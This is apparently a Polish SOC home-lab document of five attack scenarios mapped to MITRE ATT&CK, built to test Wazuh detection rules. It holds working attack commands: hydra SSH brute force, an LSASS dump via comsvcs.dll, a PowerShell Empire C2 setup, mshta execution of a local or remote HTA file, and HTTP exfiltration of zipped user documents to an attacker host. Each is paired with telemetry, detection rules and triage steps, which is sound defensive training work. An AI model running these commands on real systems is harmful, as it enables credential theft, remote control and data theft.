# 03 — Scenariusze ataków z mapowaniem MITRE ATT&CK

Pięć kontrolowanych scenariuszy ataku, które uruchamiamy z VM `kali` lub bezpośrednio na ofierze. Każdy scenariusz ma identyczną strukturę:

1. **Cel atakującego** — co próbuje osiągnąć
2. **Mapowanie MITRE** — taktyka i technika
3. **Setup** — co trzeba przygotować przed atakiem
4. **Wykonanie** — komendy krok po kroku
5. **Telemetria** — jakie logi powinny zostać wygenerowane
6. **Detekcja** — która reguła z `custom-wazuh-rules.xml` to wyłapie
7. **Co robi analityk** — pierwsze 5 minut triage

---

## Scenariusz 1 — Brute Force SSH na Wazuh Server

| Pole | Wartość |
|---|---|
| **Cel atakującego** | Uzyskanie powłoki SSH na serwerze zarządzania |
| **Taktyka MITRE** | TA0006 — Credential Access |
| **Technika** | T1110.001 — Brute Force: Password Guessing |
| **Skrypt** | [`attacks/01-brute-force-ssh.sh`](../attacks/01-brute-force-ssh.sh) |

### 1.1. Setup

Na `wazuh-srv` musimy mieć włączony SSH na porcie 22 (domyślnie tak jest), słownik haseł na Kali (`/usr/share/wordlists/rockyou.txt` — wypakuj `.gz` jeśli świeżo zainstalowane).

### 1.2. Wykonanie

```bash
# Z VM kali:
hydra -l root \
      -P /usr/share/wordlists/rockyou.txt \
      -t 4 -f -V \
      ssh://192.168.10.10
```

`-t 4` — 4 wątki (świadomie wolno, żeby nie zalać sieci);
`-f` — zatrzymaj po pierwszym sukcesie (nie zatrzyma się — bo nie odgadnie hasła root);
`-V` — verbose, widać każdą próbę.

### 1.3. Telemetria

Każda nieudana próba generuje wpis w `/var/log/auth.log` na `wazuh-srv`:

```
May 21 14:23:11 wazuh-srv sshd[18234]: Failed password for root from 192.168.30.30 port 51234 ssh2
May 21 14:23:13 wazuh-srv sshd[18235]: Failed password for root from 192.168.30.30 port 51236 ssh2
May 21 14:23:15 wazuh-srv sshd[18237]: Failed password for invalid user admin from 192.168.30.30 port 51238 ssh2
```

Wazuh ma wbudowany dekoder dla sshd (`sshd_decoders.xml`) → zdarzenia mapują się na reguły z grupy `5700` (np. rule 5710 = Failed password, 5712 = Multiple failures).

### 1.4. Detekcja

Wbudowane:
- **Rule 5712** — `sshd: Possible attack on the system`, level 10, triggers po 8 logowaniach z tego samego IP w 120 s.

Własna nadbudowa:
- **Rule 100110** (`custom-wazuh-rules.xml`) — `Brute force SSH from external segment (VLAN 30)` — łapie ten sam wzorzec, ale tylko gdy źródło jest w `192.168.30.0/24`, level 12, MITRE T1110.001.

### 1.5. Co robi analityk (pierwsze 5 minut)

1. Otwiera alert w dashboardzie, sprawdza `agent.name`, `srcip`, `data.dstuser`.
2. Idzie do `Discover`, filtruje `srcip:"192.168.30.30"` i `rule.groups:"authentication_failed"` w oknie 15 min — patrzy na całość kampanii.
3. Sprawdza w `Discover` czy z tego samego IP było logowanie udane (`rule.id:5715`) — jeśli tak, to **eskalacja na poziom 2**.
4. Sprawdza, czy konto `root` ma w ogóle prawo logowania (`grep PermitRootLogin /etc/ssh/sshd_config`).
5. Blokuje IP na firewallu (lub przez Wazuh Active Response — w produkcji już automatycznie).
6. Otwiera ticket z polami: severity, IoC (IP, user agent), action taken, recommended hardening (klucze SSH, fail2ban, port-knocking, MFA).

---

## Scenariusz 2 — Symulacja Mimikatza (dump LSASS)

| Pole | Wartość |
|---|---|
| **Cel atakującego** | Wykradnięcie hashy haseł / biletów Kerberos z pamięci procesu `lsass.exe` |
| **Taktyka MITRE** | TA0006 — Credential Access |
| **Technika** | T1003.001 — OS Credential Dumping: LSASS Memory |
| **Skrypt** | [`attacks/02-mimikatz-simulation.ps1`](../attacks/02-mimikatz-simulation.ps1) |

### 2.1. Setup

Nie pobieramy oryginalnego Mimikatza (Defender by go zablokował, a nie chcemy fałszywych warunków testowych). Zamiast tego **symulujemy zachowanie** — odczyt pamięci `lsass.exe` przez `MiniDumpWriteDump` API (dokładnie to robi Mimikatz pod spodem) i zapis do pliku.

Zachowanie jest **identyczne z punktu widzenia telemetrii Sysmona** — to wystarcza do przetestowania detekcji.

### 2.2. Wykonanie

Na WS01 jako użytkownik z uprawnieniami administratora:

```powershell
# Z repo:
powershell -ExecutionPolicy Bypass -File C:\attacks\02-mimikatz-simulation.ps1
```

Skrypt:
1. Wywołuje `MiniDumpWriteDump` na `lsass.exe` → tworzy `C:\Windows\Temp\lsass.dmp`.
2. Próbuje również tradycyjnej metody przez `comsvcs.dll`:
   ```
   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID_LSASS> C:\Windows\Temp\lsass2.dmp full
   ```

### 2.3. Telemetria

**Sysmon Event ID 10 — ProcessAccess** (klucz!):

```
EventID: 10
SourceImage: C:\Tools\dumper.exe (lub rundll32.exe)
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1410   <-- PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION
CallTrace: dbghelp.dll+0x... | ntdll.dll+0x...
```

**Sysmon Event ID 11 — FileCreate**:
```
TargetFilename: C:\Windows\Temp\lsass.dmp
```

**Sysmon Event ID 1 — ProcessCreate** (dla wariantu rundll32):
```
CommandLine: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass2.dmp full
ParentImage: C:\Windows\System32\cmd.exe
```

### 2.4. Detekcja

- **Rule 100210** — `Possible LSASS memory access (Mimikatz-like)` — pasuje gdy `Sysmon EID=10` AND `TargetImage` zawiera `lsass.exe` AND `GrantedAccess` zawiera `0x1410` lub `0x1010` lub `0x1438`, level 14, MITRE T1003.001.
- **Rule 100211** — `LSASS dump via comsvcs.dll (LOLBAS)` — pasuje na linię komend `rundll32.*comsvcs.*MiniDump`, level 13, MITRE T1003.001 + T1218.011.

### 2.5. Co robi analityk

1. **Poziom 14 = natychmiastowa eskalacja.** To są kompromitujące wskaźniki — bez kontekstu zakładamy, że to TP.
2. Sprawdza `agent.name`, `data.win.eventdata.user` — kto uruchomił proces.
3. W `Discover` filtruje `agent.name:"ws01"` w oknie 30 min wstecz — patrzy na łańcuch: jak proces dumpujący się tam znalazł (download? execution z dokumentu Office?).
4. Sprawdza FileCreate z plikiem `.dmp` — czy plik nadal istnieje, czy został przeniesiony / zekstraktowany przez sieć.
5. Kroki containment: izolacja hosta (Wazuh Active Response → blokada w firewallu Windows), poinformowanie team lead-a, zachowanie pamięci RAM do forensics.
6. Reset haseł WSZYSTKICH kont, które były ostatnio zalogowane na WS01 (`query session` + Event ID 4624 history).

---

## Scenariusz 3 — PowerShell Empire (C2)

| Pole | Wartość |
|---|---|
| **Cel atakującego** | Ustanowienie kanału C2 (Command & Control) przez PowerShell beacon |
| **Taktyka MITRE** | TA0002 — Execution + TA0011 — Command and Control |
| **Technika** | T1059.001 — Command and Scripting Interpreter: PowerShell |
| **Dodatkowo** | T1071.001 — Application Layer Protocol: Web Protocols |
| **Walkthrough** | [`attacks/03-powershell-empire.md`](../attacks/03-powershell-empire.md) |

### 3.1. Setup

Na Kali instalujemy [Starkiller](https://github.com/BC-SECURITY/Starkiller) (GUI dla Empire 5.x). Empire 5 jest aktywnie utrzymywany.

```bash
sudo apt install -y python3-pip docker.io
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire && sudo ./setup/install.sh
sudo ./ps-empire server &     # nasłuchuje na 1337/tcp (REST) i 5000/tcp (C2)
```

### 3.2. Wykonanie

W Empire CLI:

```
(Empire) > uselistener http
(Empire: http) > set Host 192.168.30.30
(Empire: http) > set Port 8080
(Empire: http) > execute

(Empire) > usestager windows/launcher_bat
(Empire: launcher_bat) > set Listener http
(Empire: launcher_bat) > generate
# → wygeneruje launcher.bat
```

Plik `launcher.bat` dostarczamy na WS01 (w realnym ataku: phishing). Tutaj — kopiujemy ręcznie:

```bash
# Z Kali, przez SMB lub przez vagrant scp:
scp launcher.bat vagrant@192.168.20.20:/tmp/launcher.bat
```

Na WS01 uruchamiamy `launcher.bat` jako zwykły użytkownik. Po kilku sekundach w Empire widać nowy agent.

### 3.3. Telemetria

Charakterystyczne dla Empire 5 (PowerShell beacon):

**Event ID 4104 (PowerShell ScriptBlockLogging)**:
```
ScriptBlockText: $wc = New-Object System.Net.WebClient; ...
                 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
                 $data = $wc.DownloadString("http://192.168.30.30:8080/admin/get.php?...");
                 IEX (New-Object IO.StreamReader( ...DeflateStream... )).ReadToEnd();
```

**Sysmon Event ID 1**:
```
CommandLine: powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64>
```

**Sysmon Event ID 3 — NetworkConnect**:
```
Image: powershell.exe
DestinationIp: 192.168.30.30
DestinationPort: 8080
DestinationHostname: -
```

### 3.4. Detekcja

- **Rule 100212** — `Suspicious PowerShell EncodedCommand` — linia komend zawiera `-Enc`, `-EncodedCommand`, `-e ` z długim base64, level 11, MITRE T1059.001 + T1027.
- **Rule 100213** — `PowerShell network connection to external IP` — koreluje EID 1 (powershell) z EID 3 (NetworkConnect) do IP spoza VLAN 20, level 10, MITRE T1071.001.
- **Rule 100214** — `PowerShell with IEX and DownloadString` — pattern w ScriptBlock (EID 4104) zawierający `IEX` AND (`DownloadString` OR `DownloadFile`), level 12, MITRE T1059.001 + T1105.

### 3.5. Co robi analityk

1. Pierwszy alert (100212) sam w sobie nie znaczy "atak" — admini też czasem używają `-EncodedCommand`. Patrzymy na **korelację**:
2. `agent.name:"ws01"` w oknie ±5 min → szukamy dodatkowych sygnałów (rule 100213, 100214).
3. Pivot na `data.win.eventdata.parentImage` — kto wystartował `powershell.exe`? Jeśli `cmd.exe` z linią komend wskazującą na `.bat`, to mamy szewski. Jeśli `explorer.exe` z dwuklika użytkownika — phishing.
4. Sprawdzamy `data.win.eventdata.user` — czy konto ma prawo wykonywać PowerShell? Konta serwisowe powinny być zablokowane przez GPO `AllSigned`.
5. Wyciągamy IoC: IP C2 (192.168.30.30), URL pattern (`/admin/get.php`), nazwa pliku launchera. Wrzucamy do bloklisty na proxy / DNS sinkhole.
6. Containment: izolacja WS01, dump pamięci RAM, wgląd w PowerShell transcripts (`C:\PSLogs\`), reset haseł.

---

## Scenariusz 4 — Living-off-the-Land: `mshta` jako proxy execution

| Pole | Wartość |
|---|---|
| **Cel atakującego** | Wykonanie kodu z ominięciem AppLocker/SRP używając zaufanego binarki Microsoft |
| **Taktyka MITRE** | TA0005 — Defense Evasion + TA0002 — Execution |
| **Technika** | T1218.005 — System Binary Proxy Execution: Mshta |
| **Skrypt** | [`attacks/04-suspicious-process.ps1`](../attacks/04-suspicious-process.ps1) |

### 4.1. Setup

`mshta.exe` to natywny binarka Windows do uruchamiania plików `.hta` (HTML Application). Jest podpisana przez Microsoft → przechodzi większość whitelistów. Atakujący używa jej do uruchomienia złośliwego JS/VBS.

### 4.2. Wykonanie

Skrypt PS na WS01 generuje plik `.hta` i go uruchamia:

```powershell
# Zawartość pliku .hta:
@'
<html><head><script language="VBScript">
  Set wshShell = CreateObject("WScript.Shell")
  wshShell.Run "powershell.exe -NoP -W Hidden -Command Write-Host 'Pwned by mshta'; Start-Process calc.exe", 0, False
  Self.Close
</script></head></html>
'@ | Out-File C:\Windows\Temp\evil.hta -Encoding ASCII

# Uruchomienie:
mshta.exe C:\Windows\Temp\evil.hta

# Wariant zdalny (jeszcze bardziej podejrzany):
mshta.exe http://192.168.30.30:8000/evil.hta
```

### 4.3. Telemetria

**Sysmon Event ID 1**:

```
Image: C:\Windows\System32\mshta.exe
CommandLine: mshta.exe C:\Windows\Temp\evil.hta
ParentImage: C:\Windows\System32\cmd.exe   (lub powershell.exe)
```

Następnie kolejny EID 1 — `mshta.exe` jako parent dla `powershell.exe`:

```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -NoP -W Hidden -Command ...
ParentImage: C:\Windows\System32\mshta.exe   <-- to jest sygnał!
```

### 4.4. Detekcja

- **Rule 100220** — `mshta.exe executing remote HTA file` — `Image` = `mshta.exe` AND `CommandLine` zawiera `http://` lub `https://`, level 12, MITRE T1218.005.
- **Rule 100221** — `Suspicious parent-child: mshta spawning script interpreter` — EID 1 gdzie `ParentImage` = `mshta.exe` AND `Image` ∈ {`powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`}, level 13, MITRE T1218.005 + T1059.

### 4.5. Co robi analityk

1. Łańcuch parent-child `mshta → powershell` to klasyczny sygnał LOLBAS. Bardzo niska liczba FP.
2. Pivot: sprawdza, skąd wziął się `.hta`. EID 11 (FileCreate) lub EID 15 (FileCreateStreamHash) wskaże proces, który zapisał plik. Najczęściej będzie to klient pocztowy lub przeglądarka (phishing załącznik / drive-by).
3. Hash pliku `.hta` (Sysmon EID 1 ma `Hashes`) leci do VirusTotal i wewnętrznego TIP.
4. Sprawdza, czy mshta jest w organizacji w ogóle używana — w 99% firm odpowiedź brzmi NIE. Jeśli nie, blokujemy mshta przez AppLocker rule "Deny mshta.exe for non-admin users".
5. Reset haseł, IR ticket, eskalacja jeśli były dalsze działania (boczne ruchy, persistence).

---

## Scenariusz 5 — Eksfiltracja danych przez HTTP POST

| Pole | Wartość |
|---|---|
| **Cel atakującego** | Wyniesienie skradzionych danych (np. dump LSASS, dokumenty) z sieci ofiary |
| **Taktyka MITRE** | TA0010 — Exfiltration |
| **Technika** | T1041 — Exfiltration Over C2 Channel |
| **Powiązane** | T1567.002 — Exfiltration to Cloud Storage; T1030 — Data Transfer Size Limits |
| **Skrypt** | [`attacks/05-data-exfiltration.py`](../attacks/05-data-exfiltration.py) |

### 5.1. Setup

Na Kali stawiamy prosty HTTP receiver (Python):

```bash
python3 -m http.server 8000 --bind 0.0.0.0
# lub coś bardziej realistycznego — Flask z endpoint /upload zapisującym pliki
```

### 5.2. Wykonanie

Na WS01 przygotowujemy "skradzione" dane:

```powershell
# Symulujemy dump skradzionych dokumentów
Compress-Archive -Path C:\Users\akowalska\Documents\* -DestinationPath C:\Windows\Temp\loot.zip
```

Następnie uruchamiamy skrypt eksfiltracyjny (`attacks/05-data-exfiltration.py`):

```bash
python3 05-data-exfiltration.py \
    --target http://192.168.30.30:8000/upload \
    --file C:\Windows\Temp\loot.zip \
    --chunk-size 1048576
```

Skrypt dzieli plik na chunki (1 MB) i wysyła je sekwencyjnie z opóźnieniami (anty-detekcja przez statystyki ruchu).

### 5.3. Telemetria

**Sysmon Event ID 3 — NetworkConnect**:

```
Image: C:\Python311\python.exe
DestinationIp: 192.168.30.30
DestinationPort: 8000
Initiated: true
```

Dla każdego chunka — wpis w Wazuh, gdzie sumarycznie widać **dziesiątki połączeń wychodzących z tego samego procesu do tego samego IP w krótkim oknie czasowym**.

Dodatkowo na poziomie sieciowym (jeśli mamy Suricata/Zeek w pipeline — w tym labie nie mamy, ale w produkcji byłby): wzorzec ruchu jest klasyfikowany jako data exfil — wysoki upload, niski download.

### 5.4. Detekcja

- **Rule 100230** — `Large data transfer from internal host to external IP` — agreguje EID 3, jeśli z jednego `agent.name` w 5 min są > 20 połączeń do tego samego `DestinationIp` poza VLAN 20, level 10, MITRE T1041.
- **Rule 100231** — `Suspicious archive creation followed by external connection` — koreluje EID 11 (FileCreate `.zip` / `.rar` / `.7z` w `Temp`) z następującym w ciągu 10 min EID 3 do IP spoza segmentu, level 12, MITRE T1041 + T1560.001.

### 5.5. Co robi analityk

1. To jest **ostatni etap kill-chaina** — analityk traktuje to z najwyższym priorytetem.
2. Patrzy na `agent.name` i `data.win.eventdata.user` — kto uruchomił proces.
3. Pivot wstecz w czasie: czy ten host był wcześniej w innych alertach z grup `T1003`, `T1059`? Jeśli tak, mamy pełny obraz incydentu od initial access do exfil.
4. Sprawdza w `Discover`, ile danych w sumie poszło (suma `network.bytes_out` jeśli pipe-line obejmuje NetFlow; bez tego — szacuje po liczbie połączeń).
5. **Containment natychmiast:** firewall block na docelowe IP, izolacja hosta, pull pliku z dysku do forensics.
6. **Notification:** w produkcji to moment, gdy uruchamia się procedura informowania PUODO/RODO (72 godziny w UE), CIO, legal.
7. **Lessons learned ticket:** dlaczego nie wykryliśmy wcześniej? Gdzie był initial access? Czy DLP byłby skuteczny?

---

## Macierz pokrycia MITRE ATT&CK

| Tactic | Technique | Sub | Scenario | Rule(s) |
|---|---|---|---|---|
| Credential Access | T1110 | .001 | 1 | 100110 |
| Credential Access | T1003 | .001 | 2 | 100210, 100211 |
| Execution | T1059 | .001 | 3 | 100212, 100213, 100214 |
| Defense Evasion | T1218 | .005 | 4 | 100220, 100221 |
| Defense Evasion | T1218 | .011 | 2 | 100211 |
| Command and Control | T1071 | .001 | 3 | 100213 |
| Exfiltration | T1041 | — | 5 | 100230, 100231 |
| Persistence | T1547 | .001 | (bonus) | 100240 |
| Discovery | T1018 | — | (bonus) | 100250 |

Bonusowe reguły (100240, 100250) są zdefiniowane w pliku XML, ale nie mają dedykowanego scenariusza w tym dokumencie — uruchamiane są jako efekt uboczny scenariuszy 2 i 3.

Następny krok: [04-detection-results.md](04-detection-results.md) — opis tego, co realnie widać w dashboardzie po wykonaniu scenariuszy.
